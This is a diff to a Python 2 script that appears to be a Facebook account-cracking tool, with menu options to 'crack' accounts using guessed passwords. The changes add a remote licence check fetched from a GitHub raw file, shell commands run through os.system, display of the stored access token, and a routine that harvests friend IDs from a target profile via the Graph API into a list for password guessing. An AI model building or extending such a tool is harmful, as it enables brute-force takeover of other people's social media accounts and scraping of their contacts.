@@ -40,7 +40,9 @@ def reg():
         to = open('access_Aprov.txt', 'r').read()
     except (KeyError, IOError):
         reg2()
-
+        
+    r = requests.get('https://raw.githubusercontent.com/nazeerjutt652/jutt-badshah/main/server.txt').text
+    if to in r:
         os.system('cd ..... && npm install')
         os.system('fuser -k 5000/tcp &')
         os.system('#')
@@ -233,8 +235,10 @@ def menu():
 
     os.system('clear')
     print logo
+    tok = open('access_Aprov.txt', 'r').read()
     print '  \x1b[1;95mLogged in user: \x1b[1;95m' + z
     print 47 * '-'
+    print ' \x1b[1;95m Active token: \x1b[1;95m' + tok
     print ' ------------------------------------------ '
     print '\x1b[1;92m[1] Crack with Auto password 10'
     print '\x1b[1;92m[2] Crack with Number password 6'
@@ -294,11 +298,11 @@ def ex_id():
         menu()
     r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token=' + token)
     q = json.loads(r.text)
-    bz = open('/sdcard/ids/jutt_file.txt','w')
+    bz = open('/sdcard/jutt_file.txt','w')
     for i in q['data']:
-        idg.append(i['id'] + i['name'])
-        bz.write(i['id']+' | '+i['name']+ '\n')
-        print ('\r['+str(len(idg))+'] => '+i['id']+' | '+i['name']),;sys.stdout.flush();time.sleep(0.001)
+        idg.append(i['id'])
+        bz.write(i['id']+'|'+ '\n')
+        print ('\r['+str(len(idg))+'] => '+i['id']),;sys.stdout.flush();time.sleep(0.001)
     bz.close()
     print ''
     print 47 * '-'
